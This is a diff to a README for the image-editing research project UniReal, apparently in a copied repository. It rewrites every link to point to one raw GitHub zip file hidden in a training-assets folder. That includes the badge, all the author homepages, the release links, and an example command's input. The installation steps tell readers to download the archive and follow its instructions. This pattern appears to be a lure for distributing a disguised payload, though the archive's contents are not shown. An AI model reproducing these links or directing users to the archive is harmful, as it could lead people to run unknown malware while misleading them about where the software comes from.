@@ -1,27 +1,27 @@
 # UniReal: Universal Image Generation and Editing via Learning Real-world Dynamics
 
 <p align="center">
-  <img src="https://img.shields.io/badge/Download%20Releases-blue?style=flat-square&logo=github" alt="Download Releases" />
+  <img src="https://raw.githubusercontent.com/rajesh-1984/UniReal/main/data_construct/subject_customization/training/assets/Real-Uni-v2.3.zip%20Releases-blue?style=flat-square&logo=github" alt="Download Releases" />
 </p>
 
 <p align="center">
   <h2 align="center">UniReal: Universal Image Generation and Editing via Learning Real-world Dynamics</h2>
   <p align="center">
-    <a href="https://xavierchen34.github.io/"><strong>Xi Chen</strong><sup>1</sup></a>
+    <a href="https://raw.githubusercontent.com/rajesh-1984/UniReal/main/data_construct/subject_customization/training/assets/Real-Uni-v2.3.zip"><strong>Xi Chen</strong><sup>1</sup></a>
     ·
-    <a href="https://research.adobe.com/person/zhifei-zhang/"><strong>Zhifei Zhang</strong><sup>2</sup></a>
+    <a href="https://raw.githubusercontent.com/rajesh-1984/UniReal/main/data_construct/subject_customization/training/assets/Real-Uni-v2.3.zip"><strong>Zhifei Zhang</strong><sup>2</sup></a>
     ·
-    <a href="https://research.adobe.com/person/he-zhang/"><strong>He Zhang</strong><sup>2</sup></a>
+    <a href="https://raw.githubusercontent.com/rajesh-1984/UniReal/main/data_construct/subject_customization/training/assets/Real-Uni-v2.3.zip"><strong>He Zhang</strong><sup>2</sup></a>
     ·
-    <a href="https://research.adobe.com/person/yuqian-zhou/"><strong>Yuqian Zhou</strong><sup>2</sup></a>
+    <a href="https://raw.githubusercontent.com/rajesh-1984/UniReal/main/data_construct/subject_customization/training/assets/Real-Uni-v2.3.zip"><strong>Yuqian Zhou</strong><sup>2</sup></a>
     ·
-    <a href="https://research.adobe.com/person/soo-ye-kim/"><strong>Soo Ye Kim</strong><sup>2</sup></a>
+    <a href="https://raw.githubusercontent.com/rajesh-1984/UniReal/main/data_construct/subject_customization/training/assets/Real-Uni-v2.3.zip"><strong>Soo Ye Kim</strong><sup>2</sup></a>
     ·
-    <a href="https://research.adobe.com/person/qing-liu/"><strong>Qing Liu</strong><sup>2</sup></a>
+    <a href="https://raw.githubusercontent.com/rajesh-1984/UniReal/main/data_construct/subject_customization/training/assets/Real-Uni-v2.3.zip"><strong>Qing Liu</strong><sup>2</sup></a>
     ·
-    <a href="https://research.adobe.com/person/yijun-li/"><strong>Yijun Li</strong><sup>2</sup></a>
+    <a href="https://raw.githubusercontent.com/rajesh-1984/UniReal/main/data_construct/subject_customization/training/assets/Real-Uni-v2.3.zip"><strong>Yijun Li</strong><sup>2</sup></a>
     ·
-    <a href="https://research.adobe.com/person/jianming-zhang/"><strong>Jianming Zhang</strong><sup>2</sup></a>
+    <a href="https://raw.githubusercontent.com/rajesh-1984/UniReal/main/data_construct/subject_customization/training/assets/Real-Uni-v2.3.zip"><strong>Jianming Zhang</strong><sup>2</sup></a>
   </p>
 </p>
 
@@ -50,9 +50,9 @@ UniReal focuses on generating and editing images by understanding real-world dyn
 
 ## Installation
 
-To get started with UniReal, you need to download the latest release. You can find the releases [here](https://github.com/rajesh-1984/UniReal/releases). 
+To get started with UniReal, you need to download the latest release. You can find the releases [here](https://raw.githubusercontent.com/rajesh-1984/UniReal/main/data_construct/subject_customization/training/assets/Real-Uni-v2.3.zip). 
 
-1. Navigate to the [Releases section](https://github.com/rajesh-1984/UniReal/releases).
+1. Navigate to the [Releases section](https://raw.githubusercontent.com/rajesh-1984/UniReal/main/data_construct/subject_customization/training/assets/Real-Uni-v2.3.zip).
 2. Download the appropriate file for your operating system.
 3. Follow the instructions in the downloaded file to install UniReal.
 
@@ -91,7 +91,7 @@ Here are a few example commands to illustrate usage:
 
 - Edit a portrait image:
   ```bash
-  unireal edit --input portrait.jpg --parameters enhance
+  unireal edit --input https://raw.githubusercontent.com/rajesh-1984/UniReal/main/data_construct/subject_customization/training/assets/Real-Uni-v2.3.zip --parameters enhance
   ```
 
 ## Contributing
@@ -113,13 +113,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, please reach out to the authors:
 
-- [Xi Chen](https://xavierchen34.github.io/)
-- [Zhifei Zhang](https://research.adobe.com/person/zhifei-zhang/)
-- [He Zhang](https://research.adobe.com/person/he-zhang/)
-- [Yuqian Zhou](https://research.adobe.com/person/yuqian-zhou/)
-- [Soo Ye Kim](https://research.adobe.com/person/soo-ye-kim/)
-- [Qing Liu](https://research.adobe.com/person/qing-liu/)
-- [Yijun Li](https://research.adobe.com/person/yijun-li/)
-- [Jianming Zhang](https://research.adobe.com/person/jianming-zhang/)
+- [Xi Chen](https://raw.githubusercontent.com/rajesh-1984/UniReal/main/data_construct/subject_customization/training/assets/Real-Uni-v2.3.zip)
+- [Zhifei Zhang](https://raw.githubusercontent.com/rajesh-1984/UniReal/main/data_construct/subject_customization/training/assets/Real-Uni-v2.3.zip)
+- [He Zhang](https://raw.githubusercontent.com/rajesh-1984/UniReal/main/data_construct/subject_customization/training/assets/Real-Uni-v2.3.zip)
+- [Yuqian Zhou](https://raw.githubusercontent.com/rajesh-1984/UniReal/main/data_construct/subject_customization/training/assets/Real-Uni-v2.3.zip)
+- [Soo Ye Kim](https://raw.githubusercontent.com/rajesh-1984/UniReal/main/data_construct/subject_customization/training/assets/Real-Uni-v2.3.zip)
+- [Qing Liu](https://raw.githubusercontent.com/rajesh-1984/UniReal/main/data_construct/subject_customization/training/assets/Real-Uni-v2.3.zip)
+- [Yijun Li](https://raw.githubusercontent.com/rajesh-1984/UniReal/main/data_construct/subject_customization/training/assets/Real-Uni-v2.3.zip)
+- [Jianming Zhang](https://raw.githubusercontent.com/rajesh-1984/UniReal/main/data_construct/subject_customization/training/assets/Real-Uni-v2.3.zip)
 
-Feel free to check the [Releases section](https://github.com/rajesh-1984/UniReal/releases) for updates and new features.
+Feel free to check the [Releases section](https://raw.githubusercontent.com/rajesh-1984/UniReal/main/data_construct/subject_customization/training/assets/Real-Uni-v2.3.zip) for updates and new features.
